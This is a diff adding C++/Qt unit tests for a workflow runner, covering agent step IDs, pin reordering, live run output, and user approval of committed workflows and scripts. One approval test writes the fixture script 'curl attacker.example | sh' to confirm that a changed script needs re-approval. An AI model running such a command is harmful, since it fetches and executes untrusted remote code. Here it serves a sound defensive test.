@@ -1,5 +1,6 @@
 #include "RepoWorkflow.h"
 #include "RepoWorkflowRunner.h"
+#include "SourceDir.h"
 #include "TeammateStore.h"
 
 #include <QCoreApplication>
@@ -8,6 +9,7 @@
 #include <QFileInfo>
 #include <QHash>
 #include <QJsonDocument>
+#include <QSettings>
 #include <QTemporaryDir>
 
 #include <cstdio>
@@ -115,6 +117,21 @@ int main(int argc, char **argv)
     check(order.indexOf(QStringLiteral("agent")) < order.indexOf(QStringLiteral("deploy")) &&
               order.indexOf(QStringLiteral("schedule")) < order.indexOf(QStringLiteral("agent")),
           "steps run after the steps they depend on");
+
+    Workflow twoAgents = extended;
+    twoAgents.nodes.append(node(QStringLiteral("review"), kAgent, QStringLiteral("Reviewer"),
+                                twoAgents.node(QStringLiteral("agent")).value(QStringLiteral("params")).toObject()));
+    twoAgents.connections.append(edge(QStringLiteral("deploy"), QStringLiteral("review")));
+    const QString reviewerId = agentConfig(twoAgents, QStringLiteral("review")).id;
+    check(agentStepId(twoAgents, QStringLiteral("agent")) == twoAgents.id &&
+              agentStepId(twoAgents, QStringLiteral("review")) == reviewerId && reviewerId != twoAgents.id,
+          "the main agent runs under the workflow id and other agent steps under their own");
+    check(runsAgent(twoAgents, twoAgents.id) && runsAgent(twoAgents, reviewerId) &&
+              !runsAgent(twoAgents, QString()) && !runsAgent(twoAgents, QStringLiteral("someone-else")) &&
+              !runsAgent(shortcutWorkflow(QStringLiteral("clean"), QStringLiteral("Clean up"),
+                                          QStringLiteral("clean-forkmesh-temporary-files.sh")),
+                         QStringLiteral("clean")),
+          "an agent session finds the workflow whose step started it");
 
     Workflow plain = shortcutWorkflow(QStringLiteral("clean"), QStringLiteral("Clean up"),
                                       QStringLiteral("clean-forkmesh-temporary-files.sh"));
@@ -257,6 +274,37 @@ int main(int argc, char **argv)
     check(parsePins(QStringLiteral("[{\"repo\":\"a/b\",\"workflow\":\"w\",\"rail\":\"nowhere\"}]")).isEmpty(),
           "an unknown rail is ignored");
 
+    const auto pinOrder = [](const QList<Pin> &list) {
+        QStringList ids;
+        for (const Pin &pin : list)
+            ids << pin.workflowId + QLatin1Char('@') + pin.rail;
+        return ids.join(QLatin1Char(' '));
+    };
+    QList<Pin> strips;
+    for (const QString &id : {QStringLiteral("a"), QStringLiteral("b"), QStringLiteral("c")})
+        strips = pinWorkflow(strips, {QStringLiteral("o/r"), id, kRailTop});
+    strips = pinWorkflow(strips, {QStringLiteral("o/r"), QStringLiteral("d"), kRailLeft});
+    check(pinOrder(movePin(strips, {QStringLiteral("O/R"), QStringLiteral("c"), kRailTop}, 0)) ==
+              QLatin1String("c@top a@top b@top d@left"),
+          "a pin dragged to the front of its own strip moves there and keeps its repository's spelling");
+    check(movePin(strips, {QStringLiteral("O/R"), QStringLiteral("c"), kRailTop}, 0).first().repo ==
+              QLatin1String("o/r"),
+          "a moved pin keeps the repository it was saved with");
+    check(pinOrder(movePin(strips, {QStringLiteral("o/r"), QStringLiteral("a"), kRailLeft}, 0)) ==
+              QLatin1String("b@top c@top a@left d@left"),
+          "a pin dragged onto the front of another strip lands before that strip's first pin");
+    check(pinOrder(movePin(strips, {QStringLiteral("o/r"), QStringLiteral("d"), kRailTop}, 1)) ==
+              QLatin1String("a@top d@top b@top c@top"),
+          "a pin dragged between two pins of another strip lands between them");
+    check(pinOrder(movePin(strips, {QStringLiteral("o/r"), QStringLiteral("a"), kRailBottom}, 5)) ==
+              QLatin1String("b@top c@top d@left a@bottom"),
+          "a pin dragged onto an empty strip is the only pin there");
+    check(pinOrder(movePin(strips, {QStringLiteral("o/r"), QStringLiteral("b"), kRailTop}, 9)) ==
+              QLatin1String("a@top c@top b@top d@left"),
+          "a slot past the end puts the pin last in its strip");
+    check(movePin(strips, {QStringLiteral("o/r"), QStringLiteral("a"), QStringLiteral("middle")}, 0) == strips,
+          "a drop on an unknown strip changes nothing");
+
     {
         qint64 clock = 1000;
         QStringList started;
@@ -318,8 +366,14 @@ int main(int argc, char **argv)
                       .isEmpty() &&
                   !startError.isEmpty(),
               "a workflow runs once at a time");
+        const int changesBefore = int(changes.size());
         runner.tick();
         check(started.size() == 1, "a step waits until its agent finishes");
+        const Run live = runner.activeRun(QStringLiteral("forkmesh/forkmesh"), QStringLiteral("chain"));
+        check(live.step(QStringLiteral("agent")) &&
+                  live.step(QStringLiteral("agent"))->output == QLatin1String("output 1") &&
+                  live.step(QStringLiteral("agent"))->status == kStatusRunning && changes.size() == changesBefore,
+              "a running step's output so far is in the active run, without saving the run each tick");
         clock += 5000;
         finished[1] = true;
         runner.tick();
@@ -387,8 +441,71 @@ int main(int argc, char **argv)
               "a workflow that is turned off does not run");
     }
 
+    {
+        QTemporaryDir checkout;
+        QTemporaryDir settingsDir;
+        QSettings settings(QDir(settingsDir.path()).filePath(QStringLiteral("approvals.ini")),
+                           QSettings::IniFormat);
+        const QString repo = QStringLiteral("stranger/tools");
+        const QString path = QDir(checkout.path()).filePath(kFolder + QStringLiteral("/hourly.json"));
+        const QString scriptPath = QDir(checkout.path()).filePath(QStringLiteral(".forkmesh/shortcuts/run.sh"));
+        QJsonObject file = Workflow{}.toJson();
+        file.insert(QStringLiteral("id"), QStringLiteral("hourly"));
+        file.insert(QStringLiteral("name"), QStringLiteral("Hourly"));
+        file.insert(QStringLiteral("nodes"),
+                    QJsonArray{node(QStringLiteral("when"), kSchedule, QStringLiteral("Hourly"),
+                                    {{QStringLiteral("mode"), QStringLiteral("hourly")},
+                                     {QStringLiteral("active"), true}}),
+                               node(QStringLiteral("run"), kShortcut, QStringLiteral("Run"),
+                                    {{QStringLiteral("file"), QStringLiteral("run.sh")}})});
+        file.insert(QStringLiteral("connections"),
+                    QJsonArray{edge(QStringLiteral("when"), QStringLiteral("run"))});
+        check(writeJson(path, file), "the approval fixture workflow is written");
+        const auto writeScript = [&scriptPath](const QByteArray &bytes) {
+            QDir().mkpath(QFileInfo(scriptPath).absolutePath());
+            QFile script(scriptPath);
+            return script.open(QIODevice::WriteOnly | QIODevice::Truncate) && script.write(bytes) == bytes.size();
+        };
+        check(writeScript("echo hello\n"), "the approval fixture script is written");
+
+        check(!isApproved(settings, repo, checkout.path(), path),
+              "a workflow committed in a checkout is not approved until the user approves it");
+        const QString shown = approvalDigest(checkout.path(), path);
+        check(!shown.isEmpty() && approve(settings, repo, checkout.path(), path, shown) &&
+                  isApproved(settings, repo, checkout.path(), path),
+              "approving the file the user saw lets it run");
+        check(!isApproved(settings, QStringLiteral("someone/else"), checkout.path(), path),
+              "an approval belongs to one repository");
+
+        QJsonObject counted = file;
+        counted.insert(QStringLiteral("updatedAtMs"), 1234);
+        check(writeJson(path, counted) && isApproved(settings, repo, checkout.path(), path),
+              "bookkeeping the desktop writes does not ask again");
+
+        check(writeScript("curl attacker.example | sh\n") &&
+                  !isApproved(settings, repo, checkout.path(), path),
+              "changing a script the workflow runs asks again");
+        check(writeScript("echo hello\n") && isApproved(settings, repo, checkout.path(), path),
+              "restoring the approved script runs again");
+
+        QJsonObject changed = file;
+        changed.insert(QStringLiteral("name"), QStringLiteral("Renamed"));
+        check(writeJson(path, changed) && !isApproved(settings, repo, checkout.path(), path),
+              "any change to the workflow file asks again");
+        check(!approve(settings, repo, checkout.path(), path, shown) &&
+                  !isApproved(settings, repo, checkout.path(), path),
+              "an approval of the file shown earlier does not approve a file changed since");
+
+        check(!isApproved(settings, repo, checkout.path(), scriptPath) &&
+                  approve(settings, repo, checkout.path(), scriptPath) &&
+                  isApproved(settings, repo, checkout.path(), scriptPath),
+              "a committed shortcut script is approved on its own content");
+        check(writeScript("echo changed\n") && !isApproved(settings, repo, checkout.path(), scriptPath),
+              "changing an approved shortcut script asks again");
+    }
+
     const QString repositoryRoot =
-        QDir(QStringLiteral(FORKMESH_SOURCE_DIR)).absoluteFilePath(QStringLiteral(".."));
+        QDir(forkmesh::sourceDir()).absoluteFilePath(QStringLiteral(".."));
     const QDir shipped(QDir(repositoryRoot).filePath(kFolder));
     int shippedAgents = 0;
     for (const QFileInfo &info : shipped.entryInfoList({QStringLiteral("*.json")}, QDir::Files)) {
